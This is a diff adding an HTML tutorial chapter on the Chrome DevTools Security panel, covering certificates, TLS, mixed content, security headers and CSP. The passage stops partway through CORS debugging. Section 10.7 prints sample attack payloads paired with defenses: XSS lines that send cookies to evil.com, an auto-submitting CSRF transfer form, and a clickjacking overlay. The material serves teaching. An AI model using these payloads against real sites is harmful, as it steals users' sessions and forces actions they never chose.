@@ -1,0 +1,1008 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Chapter 10: Security Panel</title>
+  <style>
+    * { box-sizing: border-box; margin: 0; padding: 0; }
+    body {
+      font-family: 'Segoe UI', system-ui, sans-serif;
+      background: linear-gradient(135deg, #0f172a 0%, #1e1b4b 100%);
+      color: #e4e4e7;
+      line-height: 1.8;
+      min-height: 100vh;
+      padding: 40px 20px;
+    }
+    .container { max-width: 1000px; margin: 0 auto; }
+    header {
+      text-align: center;
+      padding: 50px 40px;
+      background: linear-gradient(135deg, #059669 0%, #047857 100%);
+      border-radius: 20px;
+      margin-bottom: 40px;
+      box-shadow: 0 20px 60px rgba(5, 150, 105, 0.3);
+    }
+    header h1 { font-size: 2.5em; margin-bottom: 10px; }
+    header p { opacity: 0.95; font-size: 1.2em; }
+    .badge { 
+      display: inline-block; 
+      background: rgba(255,255,255,0.2); 
+      padding: 5px 15px; 
+      border-radius: 20px; 
+      font-size: 0.9em;
+      margin-top: 15px;
+    }
+    section {
+      background: rgba(255,255,255,0.05);
+      border-radius: 16px;
+      padding: 35px;
+      margin-bottom: 30px;
+      border: 1px solid rgba(255,255,255,0.1);
+    }
+    h2 {
+      color: #34d399;
+      font-size: 1.8em;
+      margin-bottom: 25px;
+      padding-bottom: 15px;
+      border-bottom: 2px solid rgba(52, 211, 153, 0.3);
+    }
+    h3 {
+      color: #6ee7b7;
+      font-size: 1.3em;
+      margin: 25px 0 15px 0;
+    }
+    h4 {
+      color: #a7f3d0;
+      font-size: 1.1em;
+      margin: 20px 0 10px 0;
+    }
+    p { margin-bottom: 15px; color: #d1d5db; }
+    .concept-box {
+      background: linear-gradient(135deg, rgba(5, 150, 105, 0.1), rgba(4, 120, 87, 0.1));
+      border-left: 4px solid #059669;
+      padding: 20px 25px;
+      border-radius: 0 12px 12px 0;
+      margin: 20px 0;
+    }
+    .code-block {
+      background: #1e1e2e;
+      border-radius: 12px;
+      padding: 20px;
+      margin: 20px 0;
+      overflow-x: auto;
+      border: 1px solid #333;
+    }
+    .code-block pre {
+      font-family: 'Consolas', 'Monaco', monospace;
+      font-size: 0.9em;
+      color: #a6e3a1;
+      white-space: pre-wrap;
+    }
+    .code-title {
+      background: #333;
+      color: #34d399;
+      padding: 8px 15px;
+      border-radius: 8px 8px 0 0;
+      font-size: 0.85em;
+      margin-bottom: -12px;
+      display: inline-block;
+    }
+    .highlight { color: #34d399; font-weight: 600; }
+    .note {
+      background: linear-gradient(135deg, #fbbf24 0%, #f59e0b 100%);
+      color: #1a1a2e;
+      padding: 18px 22px;
+      border-radius: 12px;
+      margin: 20px 0;
+    }
+    .note::before { content: "⚡ Key Point: "; font-weight: 700; }
+    .warning {
+      background: linear-gradient(135deg, #ef4444 0%, #dc2626 100%);
+      color: white;
+      padding: 18px 22px;
+      border-radius: 12px;
+      margin: 20px 0;
+    }
+    .warning::before { content: "🚨 Interview Alert: "; font-weight: 700; }
+    .tip {
+      background: linear-gradient(135deg, #10b981 0%, #059669 100%);
+      color: white;
+      padding: 18px 22px;
+      border-radius: 12px;
+      margin: 20px 0;
+    }
+    .tip::before { content: "💡 Pro Tip: "; font-weight: 700; }
+    .visual-diagram {
+      background: #1a1a2e;
+      border-radius: 16px;
+      padding: 30px;
+      margin: 25px 0;
+      border: 2px solid #333;
+    }
+    .diagram-title {
+      text-align: center;
+      color: #34d399;
+      font-weight: 600;
+      margin-bottom: 20px;
+      font-size: 1.1em;
+    }
+    ul, ol { margin: 15px 0 15px 25px; }
+    li { margin: 10px 0; color: #d1d5db; }
+    .comparison-table {
+      width: 100%;
+      border-collapse: collapse;
+      margin: 20px 0;
+    }
+    .comparison-table th, .comparison-table td {
+      padding: 15px;
+      text-align: left;
+      border: 1px solid #333;
+    }
+    .comparison-table th {
+      background: #374151;
+      color: #34d399;
+    }
+    .comparison-table td { background: rgba(255,255,255,0.02); }
+    code {
+      background: #374151;
+      padding: 3px 8px;
+      border-radius: 4px;
+      font-family: 'Consolas', monospace;
+      font-size: 0.9em;
+      color: #a6e3a1;
+    }
+    .security-status {
+      display: flex;
+      gap: 20px;
+      flex-wrap: wrap;
+      margin: 20px 0;
+    }
+    .status-card {
+      flex: 1;
+      min-width: 200px;
+      padding: 20px;
+      border-radius: 12px;
+      text-align: center;
+    }
+    .status-card.secure {
+      background: linear-gradient(135deg, rgba(16, 185, 129, 0.2), rgba(5, 150, 105, 0.2));
+      border: 2px solid #10b981;
+    }
+    .status-card.warning {
+      background: linear-gradient(135deg, rgba(245, 158, 11, 0.2), rgba(217, 119, 6, 0.2));
+      border: 2px solid #f59e0b;
+    }
+    .status-card.insecure {
+      background: linear-gradient(135deg, rgba(239, 68, 68, 0.2), rgba(220, 38, 38, 0.2));
+      border: 2px solid #ef4444;
+    }
+    .status-icon { font-size: 2.5em; margin-bottom: 10px; }
+    .status-title { font-weight: 600; margin-bottom: 5px; }
+    .cert-info {
+      background: #1f2937;
+      border-radius: 12px;
+      padding: 20px;
+      margin: 15px 0;
+    }
+    .cert-row {
+      display: flex;
+      justify-content: space-between;
+      padding: 10px 0;
+      border-bottom: 1px solid #374151;
+    }
+    .cert-row:last-child { border-bottom: none; }
+    .cert-label { color: #9ca3af; }
+    .cert-value { color: #34d399; font-weight: 500; }
+    .header-card {
+      background: linear-gradient(135deg, #1f2937 0%, #111827 100%);
+      border-radius: 12px;
+      padding: 20px;
+      margin: 15px 0;
+      border-left: 4px solid #34d399;
+    }
+    .header-name {
+      color: #6ee7b7;
+      font-weight: 600;
+      font-family: monospace;
+      margin-bottom: 10px;
+    }
+    .header-example {
+      background: #111827;
+      padding: 10px 15px;
+      border-radius: 8px;
+      font-family: monospace;
+      font-size: 0.85em;
+      color: #a6e3a1;
+      margin-top: 10px;
+      overflow-x: auto;
+    }
+    .attack-box {
+      background: rgba(239, 68, 68, 0.1);
+      border: 1px solid rgba(239, 68, 68, 0.3);
+      border-radius: 12px;
+      padding: 20px;
+      margin: 15px 0;
+    }
+    .attack-box h4 { color: #f87171; }
+    .defense-box {
+      background: rgba(16, 185, 129, 0.1);
+      border: 1px solid rgba(16, 185, 129, 0.3);
+      border-radius: 12px;
+      padding: 20px;
+      margin: 15px 0;
+    }
+    .defense-box h4 { color: #34d399; }
+  </style>
+</head>
+<body>
+  <div class="container">
+    <header>
+      <h1>🔒 Chapter 10: Security Panel</h1>
+      <p>HTTPS, Certificates, Mixed Content & Web Security</p>
+      <span class="badge">🟡 Intermediate Level</span>
+    </header>
+
+    <!-- Section 10.1 -->
+    <section>
+      <h2>10.1 Security Overview</h2>
+      
+      <p>The Security panel provides a comprehensive view of your page's security status, including HTTPS configuration, certificate validity, and mixed content issues.</p>
+
+      <h3>Security States</h3>
+
+      <div class="security-status">
+        <div class="status-card secure">
+          <div class="status-icon">🔒</div>
+          <div class="status-title" style="color: #10b981;">Secure</div>
+          <p style="font-size: 0.85em; color: #9ca3af;">Valid HTTPS, no mixed content, trusted certificate</p>
+        </div>
+        <div class="status-card warning">
+          <div class="status-icon">⚠️</div>
+          <div class="status-title" style="color: #f59e0b;">Info/Warning</div>
+          <p style="font-size: 0.85em; color: #9ca3af;">HTTP page, minor issues, or certificate warnings</p>
+        </div>
+        <div class="status-card insecure">
+          <div class="status-icon">🔓</div>
+          <div class="status-title" style="color: #ef4444;">Not Secure</div>
+          <p style="font-size: 0.85em; color: #9ca3af;">Mixed content, invalid certificate, or security issues</p>
+        </div>
+      </div>
+
+      <h3>Accessing the Security Panel</h3>
+      <ol>
+        <li>Open Chrome DevTools (<code>F12</code> or <code>Ctrl+Shift+I</code>)</li>
+        <li>Click on the <strong>Security</strong> tab</li>
+        <li>Reload the page to see full security analysis</li>
+      </ol>
+
+      <h3>What the Panel Shows</h3>
+      <ul>
+        <li><strong>Security Overview:</strong> Overall page security status</li>
+        <li><strong>Origin Security:</strong> Status of main origin and third-party origins</li>
+        <li><strong>Connection:</strong> TLS protocol and cipher information</li>
+        <li><strong>Certificate:</strong> SSL/TLS certificate details</li>
+        <li><strong>Resources:</strong> Mixed content and insecure resources</li>
+      </ul>
+
+      <div class="note">A padlock in the browser's address bar means the connection is encrypted, but it doesn't guarantee the site is trustworthy - only that data in transit is protected!</div>
+    </section>
+
+    <!-- Section 10.2 -->
+    <section>
+      <h2>10.2 Certificate Information</h2>
+
+      <p>SSL/TLS certificates authenticate the website's identity and enable encrypted connections.</p>
+
+      <h3>Viewing Certificate Details</h3>
+      <ol>
+        <li>In Security panel, click on <strong>"View certificate"</strong></li>
+        <li>A new window opens with full certificate information</li>
+        <li>View the certificate chain from root to leaf</li>
+      </ol>
+
+      <h3>Certificate Properties</h3>
+
+      <div class="cert-info">
+        <div class="cert-row">
+          <span class="cert-label">Subject (CN)</span>
+          <span class="cert-value">www.example.com</span>
+        </div>
+        <div class="cert-row">
+          <span class="cert-label">Issuer</span>
+          <span class="cert-value">Let's Encrypt Authority X3</span>
+        </div>
+        <div class="cert-row">
+          <span class="cert-label">Valid From</span>
+          <span class="cert-value">Dec 1, 2024</span>
+        </div>
+        <div class="cert-row">
+          <span class="cert-label">Valid Until</span>
+          <span class="cert-value">Mar 1, 2025</span>
+        </div>
+        <div class="cert-row">
+          <span class="cert-label">Serial Number</span>
+          <span class="cert-value">04:AB:C1:23:45:67:89:...</span>
+        </div>
+        <div class="cert-row">
+          <span class="cert-label">Signature Algorithm</span>
+          <span class="cert-value">SHA-256 with RSA</span>
+        </div>
+        <div class="cert-row">
+          <span class="cert-label">Public Key</span>
+          <span class="cert-value">RSA 2048 bits</span>
+        </div>
+      </div>
+
+      <h3>Certificate Chain</h3>
+
+      <div class="visual-diagram">
+        <div class="diagram-title">Certificate Trust Chain</div>
+        <div style="text-align: center; padding: 20px;">
+          <div style="background: #374151; padding: 15px 30px; border-radius: 10px; display: inline-block; margin-bottom: 10px;">
+            <strong style="color: #34d399;">Root CA</strong><br>
+            <span style="font-size: 0.85em; color: #9ca3af;">Built into browser/OS (e.g., DigiCert)</span>
+          </div>
+          <div style="color: #34d399; font-size: 1.5em;">↓</div>
+          <div style="background: #374151; padding: 15px 30px; border-radius: 10px; display: inline-block; margin-bottom: 10px;">
+            <strong style="color: #6ee7b7;">Intermediate CA</strong><br>
+            <span style="font-size: 0.85em; color: #9ca3af;">Signs end-entity certificates</span>
+          </div>
+          <div style="color: #34d399; font-size: 1.5em;">↓</div>
+          <div style="background: #374151; padding: 15px 30px; border-radius: 10px; display: inline-block;">
+            <strong style="color: #a7f3d0;">Leaf Certificate</strong><br>
+            <span style="font-size: 0.85em; color: #9ca3af;">Your website's certificate</span>
+          </div>
+        </div>
+      </div>
+
+      <h3>Common Certificate Issues</h3>
+
+      <table class="comparison-table">
+        <tr>
+          <th>Issue</th>
+          <th>Cause</th>
+          <th>Solution</th>
+        </tr>
+        <tr>
+          <td>Certificate Expired</td>
+          <td>Validity period has ended</td>
+          <td>Renew with CA or use auto-renewal</td>
+        </tr>
+        <tr>
+          <td>Name Mismatch</td>
+          <td>Certificate CN doesn't match domain</td>
+          <td>Get certificate for correct domain</td>
+        </tr>
+        <tr>
+          <td>Untrusted Issuer</td>
+          <td>CA not in browser trust store</td>
+          <td>Use trusted CA (Let's Encrypt, etc.)</td>
+        </tr>
+        <tr>
+          <td>Self-Signed</td>
+          <td>Certificate signed by itself</td>
+          <td>Only for development; use CA for production</td>
+        </tr>
+        <tr>
+          <td>Incomplete Chain</td>
+          <td>Missing intermediate certificates</td>
+          <td>Configure server with full chain</td>
+        </tr>
+      </table>
+
+      <div class="warning">Interviewers often ask about certificate chains. Know: Root CA → Intermediate CA → Leaf Certificate, and why intermediates exist (security isolation).</div>
+    </section>
+
+    <!-- Section 10.3 -->
+    <section>
+      <h2>10.3 Connection Security (TLS)</h2>
+
+      <p>The Security panel shows details about the encrypted connection between browser and server.</p>
+
+      <h3>Connection Details</h3>
+
+      <div class="cert-info">
+        <div class="cert-row">
+          <span class="cert-label">Protocol</span>
+          <span class="cert-value">TLS 1.3</span>
+        </div>
+        <div class="cert-row">
+          <span class="cert-label">Key Exchange</span>
+          <span class="cert-value">X25519</span>
+        </div>
+        <div class="cert-row">
+          <span class="cert-label">Cipher</span>
+          <span class="cert-value">AES_256_GCM</span>
+        </div>
+      </div>
+
+      <h3>TLS Versions</h3>
+
+      <table class="comparison-table">
+        <tr>
+          <th>Version</th>
+          <th>Status</th>
+          <th>Notes</th>
+        </tr>
+        <tr>
+          <td>TLS 1.3</td>
+          <td style="color: #10b981;">✅ Recommended</td>
+          <td>Fastest, most secure, modern standard</td>
+        </tr>
+        <tr>
+          <td>TLS 1.2</td>
+          <td style="color: #f59e0b;">⚠️ Acceptable</td>
+          <td>Still secure with proper configuration</td>
+        </tr>
+        <tr>
+          <td>TLS 1.1</td>
+          <td style="color: #ef4444;">❌ Deprecated</td>
+          <td>Disabled in modern browsers</td>
+        </tr>
+        <tr>
+          <td>TLS 1.0</td>
+          <td style="color: #ef4444;">❌ Deprecated</td>
+          <td>Vulnerable, should not be used</td>
+        </tr>
+        <tr>
+          <td>SSL 3.0</td>
+          <td style="color: #ef4444;">❌ Insecure</td>
+          <td>POODLE vulnerability, completely broken</td>
+        </tr>
+      </table>
+
+      <h3>TLS 1.3 Improvements</h3>
+      <ul>
+        <li><strong>Faster handshake:</strong> 1-RTT (round trip) vs 2-RTT in TLS 1.2</li>
+        <li><strong>0-RTT resumption:</strong> Even faster for returning visitors</li>
+        <li><strong>Removed weak algorithms:</strong> No MD5, SHA-1, RC4, DES, 3DES</li>
+        <li><strong>Forward secrecy required:</strong> All cipher suites use ephemeral keys</li>
+        <li><strong>Encrypted handshake:</strong> More metadata protected</li>
+      </ul>
+
+      <div class="visual-diagram">
+        <div class="diagram-title">TLS 1.3 vs TLS 1.2 Handshake</div>
+        <div style="display: flex; justify-content: space-around; flex-wrap: wrap; gap: 30px; padding: 20px;">
+          <div style="text-align: center;">
+            <h4 style="color: #f59e0b; margin-bottom: 15px;">TLS 1.2 (2-RTT)</h4>
+            <div style="background: #1f2937; padding: 15px; border-radius: 8px; font-size: 0.85em;">
+              Client → ClientHello<br>
+              Server → ServerHello, Cert, Done<br>
+              Client → KeyExchange, Finished<br>
+              Server → Finished<br>
+              <strong style="color: #f59e0b;">~300ms</strong>
+            </div>
+          </div>
+          <div style="text-align: center;">
+            <h4 style="color: #10b981; margin-bottom: 15px;">TLS 1.3 (1-RTT)</h4>
+            <div style="background: #1f2937; padding: 15px; border-radius: 8px; font-size: 0.85em;">
+              Client → ClientHello + KeyShare<br>
+              Server → ServerHello, Cert, Finished<br>
+              Client → Finished<br>
+              <strong style="color: #10b981;">~150ms</strong>
+            </div>
+          </div>
+        </div>
+      </div>
+
+      <div class="note">TLS 1.3 reduces latency by 50% by combining steps. This directly improves TTFB and page load performance!</div>
+    </section>
+
+    <!-- Section 10.4 -->
+    <section>
+      <h2>10.4 Mixed Content</h2>
+
+      <p>Mixed content occurs when an HTTPS page loads resources over HTTP, compromising the security of the entire page.</p>
+
+      <h3>Types of Mixed Content</h3>
+
+      <div class="attack-box">
+        <h4>🔴 Active Mixed Content (Blocked)</h4>
+        <p>Resources that can modify the DOM or execute code. Blocked by browsers because they can completely compromise the page.</p>
+        <ul>
+          <li><code>&lt;script src="http://..."&gt;</code></li>
+          <li><code>&lt;link rel="stylesheet" href="http://..."&gt;</code></li>
+          <li><code>&lt;iframe src="http://..."&gt;</code></li>
+          <li><code>&lt;object&gt;</code>, <code>&lt;embed&gt;</code></li>
+          <li>XMLHttpRequest / Fetch to HTTP URLs</li>
+        </ul>
+      </div>
+
+      <div style="background: rgba(245, 158, 11, 0.1); border: 1px solid rgba(245, 158, 11, 0.3); border-radius: 12px; padding: 20px; margin: 15px 0;">
+        <h4 style="color: #f59e0b;">🟡 Passive Mixed Content (Warning)</h4>
+        <p>Resources that cannot modify the page. May be loaded with a warning but can still leak information or be replaced.</p>
+        <ul>
+          <li><code>&lt;img src="http://..."&gt;</code></li>
+          <li><code>&lt;audio src="http://..."&gt;</code></li>
+          <li><code>&lt;video src="http://..."&gt;</code></li>
+        </ul>
+      </div>
+
+      <h3>Finding Mixed Content in DevTools</h3>
+      <ol>
+        <li><strong>Security Panel:</strong> Lists all mixed content resources</li>
+        <li><strong>Console:</strong> Shows mixed content warnings</li>
+        <li><strong>Network Panel:</strong> Filter by "mixed-content" or look for blocked requests</li>
+      </ol>
+
+      <div class="code-block">
+        <div class="code-title">Common Mixed Content Errors in Console</div>
+        <pre>
+// Active mixed content (blocked)
+Mixed Content: The page at 'https://example.com/' was loaded over HTTPS, 
+but requested an insecure script 'http://example.com/app.js'. 
+This request has been blocked; the content must be served over HTTPS.
+
+// Passive mixed content (warning)
+Mixed Content: The page at 'https://example.com/' was loaded over HTTPS, 
+but requested an insecure image 'http://example.com/logo.png'. 
+This content should also be served over HTTPS.</pre>
+      </div>
+
+      <h3>Fixing Mixed Content</h3>
+
+      <div class="code-block">
+        <div class="code-title">Solutions for Mixed Content</div>
+        <pre>
+&lt;!-- PROBLEM: Hardcoded HTTP URLs --&gt;
+&lt;script src="http://cdn.example.com/lib.js"&gt;&lt;/script&gt;
+&lt;img src="http://images.example.com/photo.jpg"&gt;
+
+&lt;!-- SOLUTION 1: Use HTTPS --&gt;
+&lt;script src="https://cdn.example.com/lib.js"&gt;&lt;/script&gt;
+&lt;img src="https://images.example.com/photo.jpg"&gt;
+
+&lt;!-- SOLUTION 2: Protocol-relative URLs (less recommended) --&gt;
+&lt;script src="//cdn.example.com/lib.js"&gt;&lt;/script&gt;
+
+&lt;!-- SOLUTION 3: Use CSP to upgrade insecure requests --&gt;
+&lt;meta http-equiv="Content-Security-Policy" 
+      content="upgrade-insecure-requests"&gt;
+
+&lt;!-- Or via HTTP header --&gt;
+Content-Security-Policy: upgrade-insecure-requests
+
+&lt;!-- SOLUTION 4: Use CSP to block all mixed content --&gt;
+Content-Security-Policy: block-all-mixed-content</pre>
+      </div>
+
+      <div class="warning">Mixed content breaks the padlock and user trust. A single HTTP resource can compromise an entire HTTPS page!</div>
+    </section>
+
+    <!-- Section 10.5 -->
+    <section>
+      <h2>10.5 Security Headers</h2>
+
+      <p>Security headers are HTTP response headers that enable browser security features. Check them in the Network panel under Response Headers.</p>
+
+      <h3>Essential Security Headers</h3>
+
+      <!-- HSTS -->
+      <div class="header-card">
+        <div class="header-name">Strict-Transport-Security (HSTS)</div>
+        <p style="color: #9ca3af; font-size: 0.95em;">Forces browsers to always use HTTPS for your domain. Prevents SSL stripping attacks.</p>
+        <div class="header-example">
+Strict-Transport-Security: max-age=31536000; includeSubDomains; preload
+        </div>
+        <ul style="margin-top: 15px; font-size: 0.9em;">
+          <li><code>max-age</code>: How long (seconds) browser should remember to use HTTPS</li>
+          <li><code>includeSubDomains</code>: Apply to all subdomains</li>
+          <li><code>preload</code>: Allow inclusion in browser's preload list</li>
+        </ul>
+      </div>
+
+      <!-- CSP -->
+      <div class="header-card">
+        <div class="header-name">Content-Security-Policy (CSP)</div>
+        <p style="color: #9ca3af; font-size: 0.95em;">Controls which resources the browser can load. Primary defense against XSS attacks.</p>
+        <div class="header-example">
+Content-Security-Policy: default-src 'self'; script-src 'self' https://cdn.example.com; style-src 'self' 'unsafe-inline'; img-src *; font-src 'self' https://fonts.googleapis.com
+        </div>
+      </div>
+
+      <!-- X-Content-Type-Options -->
+      <div class="header-card">
+        <div class="header-name">X-Content-Type-Options</div>
+        <p style="color: #9ca3af; font-size: 0.95em;">Prevents MIME-type sniffing. Browser must use declared Content-Type.</p>
+        <div class="header-example">
+X-Content-Type-Options: nosniff
+        </div>
+      </div>
+
+      <!-- X-Frame-Options -->
+      <div class="header-card">
+        <div class="header-name">X-Frame-Options</div>
+        <p style="color: #9ca3af; font-size: 0.95em;">Prevents clickjacking by controlling if page can be embedded in iframes.</p>
+        <div class="header-example">
+X-Frame-Options: DENY
+# or
+X-Frame-Options: SAMEORIGIN
+        </div>
+      </div>
+
+      <!-- Referrer-Policy -->
+      <div class="header-card">
+        <div class="header-name">Referrer-Policy</div>
+        <p style="color: #9ca3af; font-size: 0.95em;">Controls how much referrer information is sent with requests.</p>
+        <div class="header-example">
+Referrer-Policy: strict-origin-when-cross-origin
+        </div>
+      </div>
+
+      <!-- Permissions-Policy -->
+      <div class="header-card">
+        <div class="header-name">Permissions-Policy</div>
+        <p style="color: #9ca3af; font-size: 0.95em;">Controls which browser features/APIs can be used (formerly Feature-Policy).</p>
+        <div class="header-example">
+Permissions-Policy: geolocation=(), camera=(), microphone=(), payment=(self)
+        </div>
+      </div>
+
+      <div class="tip">Use securityheaders.com to scan your site and get a grade for your security headers configuration!</div>
+    </section>
+
+    <!-- Section 10.6 -->
+    <section>
+      <h2>10.6 Content Security Policy (CSP) Deep Dive</h2>
+
+      <p>CSP is your primary defense against XSS (Cross-Site Scripting) attacks. It tells the browser exactly which sources of content are trusted.</p>
+
+      <h3>CSP Directives</h3>
+
+      <table class="comparison-table">
+        <tr>
+          <th>Directive</th>
+          <th>Controls</th>
+          <th>Example</th>
+        </tr>
+        <tr>
+          <td><code>default-src</code></td>
+          <td>Fallback for all resource types</td>
+          <td><code>'self'</code></td>
+        </tr>
+        <tr>
+          <td><code>script-src</code></td>
+          <td>JavaScript sources</td>
+          <td><code>'self' https://cdn.com</code></td>
+        </tr>
+        <tr>
+          <td><code>style-src</code></td>
+          <td>CSS sources</td>
+          <td><code>'self' 'unsafe-inline'</code></td>
+        </tr>
+        <tr>
+          <td><code>img-src</code></td>
+          <td>Image sources</td>
+          <td><code>* data: blob:</code></td>
+        </tr>
+        <tr>
+          <td><code>font-src</code></td>
+          <td>Font file sources</td>
+          <td><code>'self' https://fonts.gstatic.com</code></td>
+        </tr>
+        <tr>
+          <td><code>connect-src</code></td>
+          <td>XHR, Fetch, WebSocket URLs</td>
+          <td><code>'self' https://api.com</code></td>
+        </tr>
+        <tr>
+          <td><code>frame-src</code></td>
+          <td>iframe sources</td>
+          <td><code>'none'</code></td>
+        </tr>
+        <tr>
+          <td><code>object-src</code></td>
+          <td>Plugin content (Flash, etc.)</td>
+          <td><code>'none'</code></td>
+        </tr>
+        <tr>
+          <td><code>base-uri</code></td>
+          <td>Restricts &lt;base&gt; element</td>
+          <td><code>'self'</code></td>
+        </tr>
+        <tr>
+          <td><code>form-action</code></td>
+          <td>Form submission URLs</td>
+          <td><code>'self'</code></td>
+        </tr>
+      </table>
+
+      <h3>CSP Source Values</h3>
+
+      <div class="code-block">
+        <div class="code-title">CSP Source Keywords</div>
+        <pre>
+'self'          - Same origin only
+'none'          - Block all sources
+'unsafe-inline' - Allow inline scripts/styles (weakens CSP!)
+'unsafe-eval'   - Allow eval() (weakens CSP!)
+'strict-dynamic'- Trust scripts loaded by trusted scripts
+
+# Specific sources
+https://example.com    - Specific domain
+https://*.example.com  - Wildcard subdomain
+https:                 - Any HTTPS source
+data:                  - Data URIs
+blob:                  - Blob URIs
+
+# Nonces and hashes (preferred for inline scripts)
+'nonce-abc123'         - Allow script with matching nonce
+'sha256-xyz...'        - Allow script with matching hash</pre>
+      </div>
+
+      <h3>CSP with Nonces (Recommended)</h3>
+
+      <div class="code-block">
+        <div class="code-title">Implementing CSP with Nonces</div>
+        <pre>
+&lt;!-- Server generates unique nonce for each request --&gt;
+&lt;!-- HTTP Header --&gt;
+Content-Security-Policy: script-src 'nonce-2726c7f26c' 'strict-dynamic'
+
+&lt;!-- HTML - inline scripts must have matching nonce --&gt;
+&lt;script nonce="2726c7f26c"&gt;
+    // This inline script is allowed
+    console.log('Trusted inline script');
+&lt;/script&gt;
+
+&lt;script&gt;
+    // This will be BLOCKED - no nonce!
+    console.log('Untrusted script');
+&lt;/script&gt;
+
+&lt;!-- 'strict-dynamic' allows scripts loaded by nonced scripts --&gt;
+&lt;script nonce="2726c7f26c"&gt;
+    // This dynamically loaded script is also trusted
+    const script = document.createElement('script');
+    script.src = 'https://example.com/trusted.js';
+    document.body.appendChild(script);
+&lt;/script&gt;</pre>
+      </div>
+
+      <h3>Testing CSP with Report-Only</h3>
+
+      <div class="code-block">
+        <div class="code-title">CSP Report-Only Mode</div>
+        <pre>
+// Use Report-Only header to test without breaking anything
+Content-Security-Policy-Report-Only: default-src 'self'; report-uri /csp-report
+
+// CSP violations are sent to your endpoint as JSON:
+{
+    "csp-report": {
+        "document-uri": "https://example.com/page",
+        "violated-directive": "script-src 'self'",
+        "blocked-uri": "https://evil.com/malicious.js",
+        "original-policy": "default-src 'self'..."
+    }
+}</pre>
+      </div>
+
+      <div class="warning">CSP is a critical interview topic! Know the common directives, the difference between 'self' and 'none', and why 'unsafe-inline' is dangerous.</div>
+    </section>
+
+    <!-- Section 10.7 -->
+    <section>
+      <h2>10.7 Common Web Security Vulnerabilities</h2>
+
+      <p>Understanding common attacks helps you use DevTools to identify and fix security issues.</p>
+
+      <!-- XSS -->
+      <div class="attack-box">
+        <h4>🔴 Cross-Site Scripting (XSS)</h4>
+        <p>Attacker injects malicious scripts that execute in victims' browsers.</p>
+        <div class="code-block" style="margin: 15px 0;">
+          <pre>
+// Example XSS attack via URL parameter
+https://example.com/search?q=&lt;script&gt;document.location='https://evil.com/steal?cookie='+document.cookie&lt;/script&gt;
+
+// Or via stored content (comments, profiles, etc.)
+User comment: &lt;img src=x onerror="fetch('https://evil.com?c='+document.cookie)"&gt;</pre>
+        </div>
+      </div>
+
+      <div class="defense-box">
+        <h4>✅ XSS Defenses</h4>
+        <ul>
+          <li><strong>Content Security Policy</strong> - Restrict script sources</li>
+          <li><strong>Output encoding</strong> - Escape HTML entities</li>
+          <li><strong>HttpOnly cookies</strong> - Prevent JS access to sensitive cookies</li>
+          <li><strong>Input validation</strong> - Sanitize user input</li>
+        </ul>
+        <div class="code-block" style="margin: 15px 0;">
+          <pre>
+// Escape HTML entities
+function escapeHtml(text) {
+    return text.replace(/[&<>"']/g, char => ({
+        '&': '&amp;', '<': '&lt;', '>': '&gt;', 
+        '"': '&quot;', "'": '&#039;'
+    }[char]));
+}
+
+// Use textContent instead of innerHTML
+element.textContent = userInput;  // Safe
+element.innerHTML = userInput;    // Dangerous!</pre>
+        </div>
+      </div>
+
+      <!-- CSRF -->
+      <div class="attack-box">
+        <h4>🔴 Cross-Site Request Forgery (CSRF)</h4>
+        <p>Attacker tricks user into performing unwanted actions on a site where they're authenticated.</p>
+        <div class="code-block" style="margin: 15px 0;">
+          <pre>
+&lt;!-- Malicious page on evil.com --&gt;
+&lt;img src="https://bank.com/transfer?to=attacker&amount=10000"&gt;
+
+&lt;!-- Or hidden form that auto-submits --&gt;
+&lt;form action="https://bank.com/transfer" method="POST" id="csrf-form"&gt;
+    &lt;input type="hidden" name="to" value="attacker"&gt;
+    &lt;input type="hidden" name="amount" value="10000"&gt;
+&lt;/form&gt;
+&lt;script&gt;document.getElementById('csrf-form').submit();&lt;/script&gt;</pre>
+        </div>
+      </div>
+
+      <div class="defense-box">
+        <h4>✅ CSRF Defenses</h4>
+        <ul>
+          <li><strong>SameSite cookies</strong> - Strict or Lax (primary defense)</li>
+          <li><strong>CSRF tokens</strong> - Unique token per session/request</li>
+          <li><strong>Check Origin/Referer headers</strong> - Verify request source</li>
+          <li><strong>Require re-authentication</strong> - For sensitive actions</li>
+        </ul>
+      </div>
+
+      <!-- Clickjacking -->
+      <div class="attack-box">
+        <h4>🔴 Clickjacking</h4>
+        <p>Attacker overlays invisible iframe to trick users into clicking hidden buttons.</p>
+        <div class="code-block" style="margin: 15px 0;">
+          <pre>
+&lt;!-- Attacker's page --&gt;
+&lt;style&gt;
+    iframe { 
+        opacity: 0;           /* Invisible */
+        position: absolute; 
+        z-index: 2; 
+    }
+    .fake-button { 
+        position: absolute; 
+        z-index: 1; 
+    }
+&lt;/style&gt;
+&lt;button class="fake-button"&gt;Click to Win!&lt;/button&gt;
+&lt;iframe src="https://bank.com/delete-account"&gt;&lt;/iframe&gt;</pre>
+        </div>
+      </div>
+
+      <div class="defense-box">
+        <h4>✅ Clickjacking Defenses</h4>
+        <div class="code-block" style="margin: 15px 0;">
+          <pre>
+// X-Frame-Options header
+X-Frame-Options: DENY
+// or
+X-Frame-Options: SAMEORIGIN
+
+// CSP frame-ancestors (more flexible)
+Content-Security-Policy: frame-ancestors 'none'
+// or
+Content-Security-Policy: frame-ancestors 'self' https://trusted.com</pre>
+        </div>
+      </div>
+
+      <div class="note">Check the Security panel and Console for CSP violations and security warnings. They often reveal attack attempts or misconfigurations!</div>
+    </section>
+
+    <!-- Section 10.8 -->
+    <section>
+      <h2>10.8 Debugging Security Issues</h2>
+
+      <h3>Security Debugging Workflow</h3>
+
+      <ol>
+        <li><strong>Check Security Panel Overview</strong>
+          <ul>
+            <li>Is the connection secure?</li>
+            <li>Any certificate issues?</li>
+            <li>Mixed content warnings?</li>
+          </ul>
+        </li>
+        <li><strong>Review Console for Errors</strong>
+          <ul>
+            <li>CSP violations</li>
+            <li>Mixed content blocks</li>
+            <li>CORS errors</li>
+          </ul>
+        </li>
+        <li><strong>Inspect Network Panel</strong>
+          <ul>
+            <li>Check response headers for security headers</li>
+            <li>Look for blocked requests</li>
+            <li>Verify HTTPS for all resources</li>
+          </ul>
+        </li>
+        <li><strong>Test with Security Tools</strong>
+          <ul>
+            <li>securityheaders.com</li>
+            <li>SSL Labs (ssllabs.com)</li>
+            <li>Mozilla Observatory</li>
+          </ul>
+        </li>
+      </ol>
+
+      <h3>CORS Debugging</h3>
+
+      <div class="code-block">
+        <div class="code-title">Common CORS Error</div>
+        <pre>
+// Console error:
+Access to fetch at 'https://api.example.com/data' from origin 'https://mysite.com' 
